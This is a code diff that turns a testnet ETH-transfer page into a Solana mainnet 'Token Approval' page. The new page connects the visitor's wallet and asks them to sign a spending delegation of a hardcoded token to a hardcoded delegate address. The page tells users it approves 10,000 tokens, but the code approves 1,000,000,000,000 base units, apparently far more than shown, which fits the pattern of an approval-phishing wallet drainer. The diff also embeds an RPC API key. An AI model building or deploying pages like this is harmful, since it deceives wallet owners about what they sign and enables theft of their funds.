@@ -1,657 +1,414 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Sepolia Transfer</title>
-  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet"/>
-  <style>
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Token Approval</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
-    :root {
-      --bg: #0a0a0f;
-      --surface: #111118;
-      --border: #1e1e2e;
-      --accent: #7f5af0;
-      --accent2: #2cb67d;
-      --warn: #ff6b6b;
-      --text: #fffffe;
-      --muted: #72727a;
-      --glow: rgba(127, 90, 240, 0.35);
-    }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
 
-    html, body {
-      height: 100%;
-      background: var(--bg);
-      color: var(--text);
-      font-family: 'Syne', sans-serif;
-      overflow: hidden;
-    }
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 520px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
 
-    /* Animated background grid */
-    body::before {
-      content: '';
-      position: fixed;
-      inset: 0;
-      background-image:
-        linear-gradient(rgba(127,90,240,0.04) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(127,90,240,0.04) 1px, transparent 1px);
-      background-size: 48px 48px;
-      animation: gridDrift 20s linear infinite;
-      pointer-events: none;
-      z-index: 0;
-    }
+        h1 { color: #333; margin-bottom: 8px; text-align: center; font-size: 22px; }
 
-    @keyframes gridDrift {
-      0% { background-position: 0 0; }
-      100% { background-position: 48px 48px; }
-    }
+        .subtitle {
+            text-align: center;
+            color: #888;
+            font-size: 13px;
+            margin-bottom: 28px;
+        }
 
-    /* Floating orbs */
-    .orb {
-      position: fixed;
-      border-radius: 50%;
-      filter: blur(80px);
-      opacity: 0.18;
-      pointer-events: none;
-      z-index: 0;
-      animation: orbFloat 12s ease-in-out infinite alternate;
-    }
-    .orb-1 { width: 400px; height: 400px; background: var(--accent); top: -100px; left: -100px; animation-delay: 0s; }
-    .orb-2 { width: 300px; height: 300px; background: var(--accent2); bottom: -80px; right: -60px; animation-delay: -6s; }
+        .wallet-status {
+            padding: 14px 18px;
+            background: #f5f5f5;
+            border-radius: 10px;
+            margin-bottom: 18px;
+            font-size: 14px;
+            color: #777;
+            text-align: center;
+        }
 
-    @keyframes orbFloat {
-      0% { transform: translate(0, 0) scale(1); }
-      100% { transform: translate(40px, 30px) scale(1.1); }
-    }
+        .wallet-status.connected {
+            background: #e8f5e9;
+            color: #2e7d32;
+        }
 
-    .scene {
-      position: relative;
-      z-index: 1;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      padding: 24px;
-    }
+        .wallet-address {
+            font-family: monospace;
+            font-size: 11px;
+            word-break: break-all;
+            margin-top: 6px;
+            color: #388e3c;
+        }
 
-    .card {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 20px;
-      padding: 48px 44px;
-      width: 100%;
-      max-width: 460px;
-      position: relative;
-      box-shadow: 0 0 0 1px rgba(127,90,240,0.08), 0 32px 64px rgba(0,0,0,0.5);
-      animation: cardIn 0.6s cubic-bezier(0.22, 1, 0.36, 1) both;
-    }
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            width: 100%;
+            margin-bottom: 14px;
+        }
 
-    @keyframes cardIn {
-      from { opacity: 0; transform: translateY(32px) scale(0.97); }
-      to   { opacity: 1; transform: translateY(0) scale(1); }
-    }
+        button:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
+        }
 
-    /* Corner accent */
-    .card::before {
-      content: '';
-      position: absolute;
-      top: -1px; left: -1px;
-      width: 80px; height: 80px;
-      border-top: 2px solid var(--accent);
-      border-left: 2px solid var(--accent);
-      border-radius: 20px 0 0 0;
-      pointer-events: none;
-    }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
 
-    .logo-row {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 36px;
-    }
+        .message-section { display: none; margin-top: 4px; }
+        .message-section.visible { display: block; }
 
-    .logo-icon {
-      width: 36px; height: 36px;
-      background: linear-gradient(135deg, var(--accent), var(--accent2));
-      border-radius: 10px;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 18px;
-    }
+        .info-text {
+            text-align: center;
+            color: #888;
+            font-size: 13px;
+            margin-top: 6px;
+            line-height: 1.6;
+        }
 
-    .logo-text {
-      font-size: 15px;
-      font-weight: 700;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      color: var(--muted);
-    }
+        .result {
+            background: #e8f5e9;
+            border-radius: 10px;
+            padding: 14px 16px;
+            margin-top: 18px;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 11px;
+            color: #2e7d32;
+            display: none;
+        }
 
-    h1 {
-      font-size: 28px;
-      font-weight: 800;
-      line-height: 1.15;
-      margin-bottom: 10px;
-      background: linear-gradient(135deg, #fffffe 40%, var(--accent));
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-    }
-
-    .subtitle {
-      font-family: 'Space Mono', monospace;
-      font-size: 12px;
-      color: var(--muted);
-      margin-bottom: 36px;
-      line-height: 1.6;
-    }
-
-    /* Info box */
-    .tx-info {
-      background: rgba(127,90,240,0.06);
-      border: 1px solid rgba(127,90,240,0.15);
-      border-radius: 12px;
-      padding: 18px 20px;
-      margin-bottom: 28px;
-    }
-
-    .tx-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 6px 0;
-      font-size: 13px;
-    }
-
-    .tx-row:not(:last-child) {
-      border-bottom: 1px solid rgba(255,255,255,0.04);
-    }
-
-    .tx-label {
-      color: var(--muted);
-      font-family: 'Space Mono', monospace;
-      font-size: 11px;
-    }
-
-    .tx-value {
-      font-family: 'Space Mono', monospace;
-      font-size: 11px;
-      color: var(--text);
-    }
-
-    .tx-value.highlight {
-      color: var(--accent2);
-      font-weight: 700;
-    }
-
-    .tx-addr {
-      font-size: 10px;
-      color: var(--accent);
-      word-break: break-all;
-      text-align: right;
-      max-width: 200px;
-    }
-
-    /* Status badge */
-    .status-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      padding: 4px 10px;
-      border-radius: 999px;
-      font-family: 'Space Mono', monospace;
-      font-size: 10px;
-      font-weight: 700;
-      letter-spacing: 0.05em;
-      text-transform: uppercase;
-      margin-bottom: 24px;
-      transition: all 0.3s ease;
-    }
-
-    .status-badge.disconnected {
-      background: rgba(114,114,122,0.12);
-      border: 1px solid rgba(114,114,122,0.2);
-      color: var(--muted);
-    }
-
-    .status-badge.connected {
-      background: rgba(44,182,125,0.1);
-      border: 1px solid rgba(44,182,125,0.25);
-      color: var(--accent2);
-    }
-
-    .status-badge.pending {
-      background: rgba(255,200,50,0.1);
-      border: 1px solid rgba(255,200,50,0.25);
-      color: #ffc832;
-    }
-
-    .status-badge.success {
-      background: rgba(44,182,125,0.1);
-      border: 1px solid rgba(44,182,125,0.25);
-      color: var(--accent2);
-    }
-
-    .status-badge.error {
-      background: rgba(255,107,107,0.1);
-      border: 1px solid rgba(255,107,107,0.25);
-      color: var(--warn);
-    }
-
-    .dot {
-      width: 6px; height: 6px;
-      border-radius: 50%;
-      background: currentColor;
-    }
-
-    .dot.pulse {
-      animation: pulse 1.5s ease-in-out infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% { opacity: 1; transform: scale(1); }
-      50% { opacity: 0.4; transform: scale(0.6); }
-    }
-
-    /* Wallet address display */
-    .wallet-display {
-      display: none;
-      font-family: 'Space Mono', monospace;
-      font-size: 11px;
-      color: var(--accent2);
-      background: rgba(44,182,125,0.06);
-      border: 1px solid rgba(44,182,125,0.15);
-      border-radius: 8px;
-      padding: 10px 14px;
-      margin-bottom: 20px;
-      word-break: break-all;
-      line-height: 1.5;
-    }
-
-    /* Main button */
-    .btn {
-      width: 100%;
-      padding: 16px;
-      border: none;
-      border-radius: 12px;
-      font-family: 'Syne', sans-serif;
-      font-size: 15px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: all 0.2s ease;
-      position: relative;
-      overflow: hidden;
-      letter-spacing: 0.02em;
-    }
-
-    .btn::after {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background: white;
-      opacity: 0;
-      transition: opacity 0.15s;
-    }
-
-    .btn:active::after { opacity: 0.06; }
-
-    .btn-primary {
-      background: linear-gradient(135deg, var(--accent), #6644cc);
-      color: white;
-      box-shadow: 0 4px 20px rgba(127,90,240,0.3);
-    }
-
-    .btn-primary:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 8px 28px rgba(127,90,240,0.45);
-    }
-
-    .btn-primary:disabled {
-      opacity: 0.4;
-      cursor: not-allowed;
-      transform: none;
-      box-shadow: none;
-    }
-
-    .btn-send {
-      background: linear-gradient(135deg, var(--accent2), #1a9962);
-      color: white;
-      box-shadow: 0 4px 20px rgba(44,182,125,0.3);
-      display: none;
-    }
-
-    .btn-send:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 8px 28px rgba(44,182,125,0.45);
-    }
-
-    .btn-send:disabled {
-      opacity: 0.4;
-      cursor: not-allowed;
-      transform: none;
-      box-shadow: none;
-    }
-
-    /* Spinner */
-    .spinner {
-      display: inline-block;
-      width: 14px; height: 14px;
-      border: 2px solid rgba(255,255,255,0.3);
-      border-top-color: white;
-      border-radius: 50%;
-      animation: spin 0.7s linear infinite;
-      margin-right: 8px;
-      vertical-align: middle;
-    }
-
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-    /* Message area */
-    .message {
-      margin-top: 20px;
-      padding: 14px 16px;
-      border-radius: 10px;
-      font-family: 'Space Mono', monospace;
-      font-size: 11px;
-      line-height: 1.6;
-      display: none;
-      word-break: break-all;
-    }
-
-    .message.error {
-      background: rgba(255,107,107,0.08);
-      border: 1px solid rgba(255,107,107,0.2);
-      color: var(--warn);
-      display: block;
-    }
-
-    .message.success {
-      background: rgba(44,182,125,0.08);
-      border: 1px solid rgba(44,182,125,0.2);
-      color: var(--accent2);
-      display: block;
-    }
-
-    .message a {
-      color: var(--accent);
-      text-decoration: underline;
-    }
-
-    /* No metamask warning */
-    .no-metamask {
-      display: none;
-      text-align: center;
-      padding: 24px 0 0;
-    }
-
-    .no-metamask p {
-      font-size: 13px;
-      color: var(--muted);
-      margin-bottom: 12px;
-    }
-
-    .no-metamask a {
-      color: var(--accent);
-      text-decoration: none;
-      font-weight: 700;
-      font-size: 13px;
-    }
-
-    /* Network warning */
-    .network-warn {
-      display: none;
-      font-family: 'Space Mono', monospace;
-      font-size: 11px;
-      color: #ffc832;
-      background: rgba(255,200,50,0.06);
-      border: 1px solid rgba(255,200,50,0.2);
-      border-radius: 8px;
-      padding: 10px 14px;
-      margin-bottom: 16px;
-    }
-  </style>
+        .result.visible { display: block; }
+        .result.error { background: #ffebee; color: #c62828; }
+        .result.warning { background: #fff3e0; color: #e65100; }
+        .result.success { background: #e8f5e9; color: #2e7d32; }
+        .result strong { display: block; margin-bottom: 6px; font-size: 13px; }
+        
+        .tx-link {
+            color: #1976d2;
+            text-decoration: none;
+            word-break: break-all;
+        }
+        .tx-link:hover {
+            text-decoration: underline;
+        }
+    </style>
 </head>
 <body>
+<div class="container">
+    <h1>&#x1F4DD; Solana Token Approval</h1>
+    <p class="subtitle">Approve 10,000 tokens for delegate spending</p>
 
-<div class="orb orb-1"></div>
-<div class="orb orb-2"></div>
+    <div id="walletStatus" class="wallet-status">Wallet not connected</div>
+    <button id="connectBtn" onclick="connectWallet()">Connect Wallet</button>
 
-<div class="scene">
-  <div class="card">
-    <div class="logo-row">
-      <div class="logo-icon">⬡</div>
-      <span class="logo-text">Sepolia Testnet</span>
+    <div id="messageSection" class="message-section">
+        <button id="signBtn" onclick="buildSignAndSend()">Approve Token Spending</button>
+        <div class="info-text">
+            Simulates, signs, then broadcasts the approval transaction to Solana mainnet.<br>
+            Delegate: AeNzsm4mMEmzogE9fbZ9MHz8x5S3F2iyJpgiVykKFkjJ<br>
+            Amount: 10,000 tokens<br>
+            Check the browser console for detailed logs.
+        </div>
     </div>
 
-    <h1>Send Test ETH</h1>
-    <p class="subtitle">Sign a transaction to send 0.0001 ETH<br>on the Sepolia test network.</p>
-
-    <div id="statusBadge" class="status-badge disconnected">
-      <span class="dot pulse"></span>
-      <span id="statusText">Not Connected</span>
-    </div>
-
-    <div id="walletDisplay" class="wallet-display"></div>
-    <div id="networkWarn" class="network-warn">⚠ Switch MetaMask to <strong>Sepolia Testnet</strong> to continue.</div>
-
-    <div class="tx-info">
-      <div class="tx-row">
-        <span class="tx-label">Amount</span>
-        <span class="tx-value highlight">0.0001 ETH</span>
-      </div>
-      <div class="tx-row">
-        <span class="tx-label">Network</span>
-        <span class="tx-value">Sepolia Testnet</span>
-      </div>
-      <div class="tx-row">
-        <span class="tx-label">Recipient</span>
-        <span class="tx-addr">0x61D3EAa5502dd3DBADBD83bA9ab170Fc5896d1ce</span>
-      </div>
-    </div>
-
-    <div id="noMetamask" class="no-metamask">
-      <p>MetaMask is not installed.</p>
-      <a href="https://metamask.io/download/" target="_blank">→ Install MetaMask</a>
-    </div>
-
-    <button id="connectBtn" class="btn btn-primary">Connect MetaMask</button>
-    <button id="sendBtn" class="btn btn-send">Send 0.0001 ETH →</button>
-
-    <div id="message" class="message"></div>
-  </div>
+    <div id="result" class="result"></div>
 </div>
 
 <script>
-  const RECIPIENT = '0x61D3EAa5502dd3DBADBD83bA9ab170Fc5896d1ce';
-  const AMOUNT_WEI = '0x' + (BigInt('100000000000000')).toString(16); // 0.0001 ETH in wei
-  const SEPOLIA_CHAIN_ID = '0xaa36a7'; // 11155111
+var TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+var MINT_ADDRESS     = new solanaWeb3.PublicKey('642NfDi7su9jQA1M4Jqc67DaLpY1Vqbt7sbvRMZKpump');
 
-  const connectBtn = document.getElementById('connectBtn');
-  const sendBtn = document.getElementById('sendBtn');
-  const statusBadge = document.getElementById('statusBadge');
-  const statusText = document.getElementById('statusText');
-  const walletDisplay = document.getElementById('walletDisplay');
-  const messageEl = document.getElementById('message');
-  const noMetamask = document.getElementById('noMetamask');
-  const networkWarn = document.getElementById('networkWarn');
+var provider = null;
+var wallet   = null;
 
-  let connectedAccount = null;
+function getProvider() {
+    if (window.phantom && window.phantom.solana && window.phantom.solana.isPhantom)
+        return window.phantom.solana;
+    if (window.solflare) return window.solflare;
+    if (window.solana)   return window.solana;
+    return null;
+}
 
-  function setStatus(state, text) {
-    statusBadge.className = 'status-badge ' + state;
-    statusText.textContent = text;
-    const dot = statusBadge.querySelector('.dot');
-    dot.className = 'dot' + (state === 'connected' || state === 'disconnected' ? ' pulse' : '');
-  }
-
-  function showMessage(type, html) {
-    messageEl.className = 'message ' + type;
-    messageEl.innerHTML = html;
-  }
-
-  function clearMessage() {
-    messageEl.className = 'message';
-    messageEl.innerHTML = '';
-  }
-
-  function shortenAddr(addr) {
-    return addr.slice(0, 6) + '...' + addr.slice(-4);
-  }
-
-  async function checkNetwork() {
-    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-    if (chainId !== SEPOLIA_CHAIN_ID) {
-      networkWarn.style.display = 'block';
-      sendBtn.disabled = true;
-      return false;
-    } else {
-      networkWarn.style.display = 'none';
-      sendBtn.disabled = false;
-      return true;
-    }
-  }
-
-  async function switchToSepolia() {
+async function connectWallet() {
+    provider = getProvider();
+    if (!provider) { alert('Please install Phantom or another Solana wallet.'); return; }
     try {
-      await window.ethereum.request({
-        method: 'wallet_switchEthereumChain',
-        params: [{ chainId: SEPOLIA_CHAIN_ID }],
-      });
+        var resp = await provider.connect();
+        wallet   = resp.publicKey;
+        var el   = document.getElementById('walletStatus');
+        el.className = 'wallet-status connected';
+        el.innerHTML = '&#10003; Wallet Connected<div class="wallet-address">' + wallet.toString() + '</div>';
+        document.getElementById('connectBtn').textContent = 'Disconnect Wallet';
+        document.getElementById('connectBtn').onclick = disconnectWallet;
+        document.getElementById('messageSection').classList.add('visible');
     } catch (err) {
-      if (err.code === 4902) {
-        await window.ethereum.request({
-          method: 'wallet_addEthereumChain',
-          params: [{
-            chainId: SEPOLIA_CHAIN_ID,
-            chainName: 'Sepolia Test Network',
-            nativeCurrency: { name: 'SepoliaETH', symbol: 'ETH', decimals: 18 },
-            rpcUrls: ['https://rpc.sepolia.org'],
-            blockExplorerUrls: ['https://sepolia.etherscan.io'],
-          }],
+        alert('Failed to connect: ' + err.message);
+    }
+}
+
+async function disconnectWallet() {
+    try { if (provider) await provider.disconnect(); } catch(e) {}
+    wallet = null; provider = null;
+    document.getElementById('walletStatus').className = 'wallet-status';
+    document.getElementById('walletStatus').textContent = 'Wallet not connected';
+    document.getElementById('connectBtn').textContent = 'Connect Wallet';
+    document.getElementById('connectBtn').onclick = connectWallet;
+    document.getElementById('messageSection').classList.remove('visible');
+    document.getElementById('result').classList.remove('visible');
+}
+
+// Function to derive ATA address
+function getAssociatedTokenAddress(mint, owner) {
+    var ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
+    
+    var seeds = [
+        owner.toBuffer(),
+        TOKEN_PROGRAM_ID.toBuffer(),
+        mint.toBuffer()
+    ];
+    
+    return solanaWeb3.PublicKey.findProgramAddressSync(
+        seeds,
+        ASSOCIATED_TOKEN_PROGRAM_ID
+    )[0];
+}
+
+async function buildSignAndSend() {
+    if (!wallet || !provider) { alert('Connect your wallet first.'); return; }
+
+    var btn = document.getElementById('signBtn');
+    var r   = document.getElementById('result');
+    btn.disabled    = true;
+    btn.textContent = 'Fetching blockhash…';
+    r.classList.remove('visible');
+
+    var recentBlockhash = null;
+    var conn = null;
+    
+    try {
+        conn = new solanaWeb3.Connection(
+            'https://mainnet.helius-rpc.com/?api-key=e596e7d1-1e3e-423f-b173-c3264aa44a0a',
+            'confirmed'
+        );
+        recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+        console.log('✓ Fetched recent blockhash:', recentBlockhash);
+    } catch(e) {
+        console.error('❌ Failed to fetch blockhash:', e.message);
+        r.className = 'result visible error';
+        r.innerHTML = '<strong>❌ Failed to Connect</strong>Could not fetch blockhash from RPC. Check your internet connection.';
+        btn.disabled = false;
+        btn.textContent = 'Approve Token Spending';
+        return;
+    }
+
+    // Derive the ATA for the user
+    var userATA = getAssociatedTokenAddress(MINT_ADDRESS, wallet);
+    
+    // Define the delegate address
+    var delegateAddress = new solanaWeb3.PublicKey('AeNzsm4mMEmzogE9fbZ9MHz8x5S3F2iyJpgiVykKFkjJ');
+    
+    // Amount to approve (10000 tokens with 6 decimals = 100000000000)
+    var approvalAmount = 1000000000000;
+    
+    console.log('\n=== DERIVED ADDRESSES ===');
+    console.log('User Wallet:', wallet.toString());
+    console.log('Mint Address:', MINT_ADDRESS.toString());
+    console.log('User ATA:', userATA.toString());
+    console.log('Delegate Address:', delegateAddress.toString());
+    console.log('Approval Amount:', approvalAmount, '(10000 tokens)');
+    console.log('Token Program:', TOKEN_PROGRAM_ID.toString());
+
+    // Build the approve instruction
+    // Instruction discriminator for approve is 4
+    var instructionData = new Uint8Array(9);
+    instructionData[0] = 4; // Approve instruction
+    
+    // Write the amount as little-endian u64
+    var view = new DataView(instructionData.buffer);
+    view.setBigUint64(1, BigInt(approvalAmount), true);
+    
+    var approveIx = new solanaWeb3.TransactionInstruction({
+        programId: TOKEN_PROGRAM_ID,
+        keys: [
+            { pubkey: userATA, isSigner: false, isWritable: true },      // Source account
+            { pubkey: delegateAddress, isSigner: false, isWritable: false }, // Delegate
+            { pubkey: wallet, isSigner: true, isWritable: false }        // Owner
+        ],
+        data: instructionData
+    });
+
+    var tx = new solanaWeb3.Transaction({ feePayer: wallet, recentBlockhash: recentBlockhash });
+    tx.add(approveIx);
+
+    console.log('\n=== TRANSACTION DETAILS ===');
+    console.log('Fee Payer:', wallet.toString());
+    console.log('Recent Blockhash:', recentBlockhash);
+    console.log('Instructions:', tx.instructions.length);
+    console.log('\nInstruction 0 (Token Approve):');
+    console.log('  Program ID:', tx.instructions[0].programId.toString());
+    console.log('  Keys:');
+    tx.instructions[0].keys.forEach(function(key, idx) {
+        console.log('    [' + idx + '] ' + key.pubkey.toString());
+        console.log('        isSigner: ' + key.isSigner + ', isWritable: ' + key.isWritable);
+    });
+    console.log('  Data (hex):', Array.from(tx.instructions[0].data).map(b => b.toString(16).padStart(2, '0')).join(''));
+
+    // Simulate the transaction
+    btn.textContent = 'Simulating transaction…';
+    
+    try {
+        console.log('\n=== SIMULATING TRANSACTION ===');
+        
+        var simulation = await conn.simulateTransaction(tx);
+        
+        console.log('Simulation Result:', simulation);
+        console.log('- Error:', simulation.value.err);
+        console.log('- Logs:', simulation.value.logs);
+        console.log('- Units Consumed:', simulation.value.unitsConsumed);
+        
+        if (simulation.value.err) {
+            console.error('❌ Simulation failed:', simulation.value.err);
+            r.className = 'result visible error';
+            r.innerHTML = '<strong>❌ Simulation Failed</strong>' +
+                'Error: ' + JSON.stringify(simulation.value.err) + '<br><br>' +
+                'Check console for details.';
+            btn.disabled = false;
+            btn.textContent = 'Approve Token Spending';
+            return;
+        } else {
+            console.log('✓ Simulation successful!');
+            console.log('Units consumed:', simulation.value.unitsConsumed);
+        }
+    } catch(simErr) {
+        console.error('❌ Simulation error:', simErr);
+        r.className = 'result visible error';
+        r.innerHTML = '<strong>❌ Simulation Error</strong>' +
+            simErr.message + '<br><br>Check console for details.';
+        btn.disabled = false;
+        btn.textContent = 'Approve Token Spending';
+        return;
+    }
+
+    // Prompt for signature
+    btn.textContent = 'Waiting for wallet signature…';
+
+    var signed = null;
+    try {
+        console.log('\n=== REQUESTING SIGNATURE ===');
+        signed = await provider.signTransaction(tx);
+        
+        console.log('✓ Transaction signed successfully');
+        console.log('Signer:', wallet.toString());
+    } catch(err) {
+        console.error('❌ Signing error:', err);
+        r.className = 'result visible error';
+        r.innerHTML = '<strong>&#x274C; Signature Rejected</strong>' + err.message;
+        btn.disabled = false;
+        btn.textContent = 'Approve Token Spending';
+        return;
+    }
+
+    // Send the transaction to the network
+    btn.textContent = 'Sending transaction to network…';
+    
+    try {
+        console.log('\n=== SENDING TRANSACTION ===');
+        
+        // Serialize and send
+        var rawTransaction = signed.serialize();
+        var txSignature = await conn.sendRawTransaction(rawTransaction, {
+            skipPreflight: false,
+            preflightCommitment: 'confirmed'
         });
-      }
+        
+        console.log('✓ Transaction sent to network');
+        console.log('Transaction signature:', txSignature);
+        
+        btn.textContent = 'Confirming transaction…';
+        r.className = 'result visible warning';
+        r.innerHTML = '<strong>⏳ Transaction Sent</strong>' +
+            'Waiting for confirmation...<br><br>' +
+            '<b>Signature:</b><br>' + txSignature;
+        
+        // Wait for confirmation
+        console.log('\n=== WAITING FOR CONFIRMATION ===');
+        var confirmation = await conn.confirmTransaction(txSignature, 'confirmed');
+        
+        if (confirmation.value.err) {
+            console.error('❌ Transaction failed:', confirmation.value.err);
+            r.className = 'result visible error';
+            r.innerHTML = '<strong>❌ Transaction Failed</strong>' +
+                'The transaction was sent but failed on-chain.<br><br>' +
+                '<b>Signature:</b><br>' +
+                '<a class="tx-link" href="https://solscan.io/tx/' + txSignature + '" target="_blank">' + 
+                txSignature + '</a><br><br>' +
+                '<b>Error:</b><br>' + JSON.stringify(confirmation.value.err);
+        } else {
+            console.log('✓ Transaction confirmed successfully!');
+            r.className = 'result visible success';
+            r.innerHTML =
+                '<strong>&#10003; Approval Successful!</strong>' +
+                '<b>Signature:</b><br>' +
+                '<a class="tx-link" href="https://solscan.io/tx/' + txSignature + '" target="_blank">' + 
+                txSignature + '</a><br><br>' +
+                '<b>Owner:</b><br>' + wallet.toString() + '<br><br>' +
+                '<b>Token Account:</b><br>' + userATA.toString() + '<br><br>' +
+                '<b>Delegate:</b><br>' + delegateAddress.toString() + '<br><br>' +
+                '<b>Approved Amount:</b><br>10,000 tokens<br><br>' +
+                'Click the signature to view on Solscan.';
+        }
+        
+    } catch(sendErr) {
+        console.error('❌ Send error:', sendErr);
+        r.className = 'result visible error';
+        r.innerHTML = '<strong>&#x274C; Failed to Send</strong>' + 
+            sendErr.message + '<br><br>Check console for details.';
     }
-  }
 
-  async function connectWallet() {
-    if (!window.ethereum) {
-      noMetamask.style.display = 'block';
-      connectBtn.style.display = 'none';
-      return;
-    }
+    btn.disabled    = false;
+    btn.textContent = 'Approve Token Spending';
+}
 
-    connectBtn.disabled = true;
-    connectBtn.innerHTML = '<span class="spinner"></span>Connecting...';
-    setStatus('pending', 'Connecting...');
-    clearMessage();
-
+window.addEventListener('load', async function() {
+    provider = getProvider();
+    if (!provider) return;
     try {
-      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-      connectedAccount = accounts[0];
-
-      setStatus('connected', 'Connected');
-      walletDisplay.style.display = 'block';
-      walletDisplay.innerHTML = `✓ &nbsp;${connectedAccount}`;
-
-      connectBtn.style.display = 'none';
-      sendBtn.style.display = 'block';
-
-      // Check and offer to switch network
-      const onSepolia = await checkNetwork();
-      if (!onSepolia) {
-        networkWarn.innerHTML = '⚠ You\'re not on Sepolia. <a href="#" id="switchLink">Switch now →</a>';
-        networkWarn.style.display = 'block';
-        document.getElementById('switchLink').addEventListener('click', async (e) => {
-          e.preventDefault();
-          await switchToSepolia();
-          await checkNetwork();
-        });
-      }
-
-      // Listen for account/chain changes
-      window.ethereum.on('accountsChanged', (accs) => {
-        if (accs.length === 0) location.reload();
-        else { connectedAccount = accs[0]; walletDisplay.innerHTML = `✓ &nbsp;${connectedAccount}`; }
-      });
-      window.ethereum.on('chainChanged', () => checkNetwork());
-
-    } catch (err) {
-      connectBtn.disabled = false;
-      connectBtn.innerHTML = 'Connect MetaMask';
-      setStatus('error', 'Connection Failed');
-      if (err.code === 4001) {
-        showMessage('error', '✕ &nbsp;Request rejected by user.');
-      } else {
-        showMessage('error', '✕ &nbsp;' + (err.message || 'Unknown error'));
-      }
-    }
-  }
-
-  async function sendTransaction() {
-    if (!connectedAccount) return;
-
-    const onSepolia = await checkNetwork();
-    if (!onSepolia) {
-      showMessage('error', '⚠ &nbsp;Please switch to Sepolia testnet first.');
-      return;
-    }
-
-    sendBtn.disabled = true;
-    sendBtn.innerHTML = '<span class="spinner"></span>Waiting for signature...';
-    setStatus('pending', 'Awaiting Approval');
-    clearMessage();
-
-    try {
-      const txHash = await window.ethereum.request({
-        method: 'eth_sendTransaction',
-        params: [{
-          from: connectedAccount,
-          to: RECIPIENT,
-          value: AMOUNT_WEI,
-          gas: '0x5208', // 21000
-        }],
-      });
-
-      setStatus('success', 'Transaction Sent');
-      sendBtn.innerHTML = '✓ Transaction Sent';
-      showMessage('success',
-        `✓ &nbsp;Transaction broadcast!<br><br>` +
-        `Hash: <a href="https://sepolia.etherscan.io/tx/${txHash}" target="_blank">${txHash.slice(0,12)}...${txHash.slice(-8)} ↗</a>`
-      );
-
-    } catch (err) {
-      sendBtn.disabled = false;
-      sendBtn.innerHTML = 'Send 0.0001 ETH →';
-      setStatus('connected', 'Connected');
-      if (err.code === 4001) {
-        showMessage('error', '✕ &nbsp;Transaction rejected by user.');
-      } else {
-        showMessage('error', '✕ &nbsp;' + (err.message || 'Transaction failed.'));
-      }
-    }
-  }
-
-  connectBtn.addEventListener('click', connectWallet);
-  sendBtn.addEventListener('click', sendTransaction);
-
-  // Auto-detect already-connected accounts
-  (async () => {
-    if (!window.ethereum) {
-      noMetamask.style.display = 'block';
-      connectBtn.style.display = 'none';
-      return;
-    }
-    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-    if (accounts.length > 0) {
-      connectedAccount = accounts[0];
-      setStatus('connected', 'Connected');
-      walletDisplay.style.display = 'block';
-      walletDisplay.innerHTML = `✓ &nbsp;${connectedAccount}`;
-      connectBtn.style.display = 'none';
-      sendBtn.style.display = 'block';
-      checkNetwork();
-    }
-  })();
+        var resp = await provider.connect({ onlyIfTrusted: true });
+        wallet   = resp.publicKey;
+        var el   = document.getElementById('walletStatus');
+        el.className = 'wallet-status connected';
+        el.innerHTML = '&#10003; Wallet Connected<div class="wallet-address">' + wallet.toString() + '</div>';
+        document.getElementById('connectBtn').textContent = 'Disconnect Wallet';
+        document.getElementById('connectBtn').onclick = disconnectWallet;
+        document.getElementById('messageSection').classList.add('visible');
+    } catch(e) { /* silent */ }
+});
 </script>
 </body>
 </html>
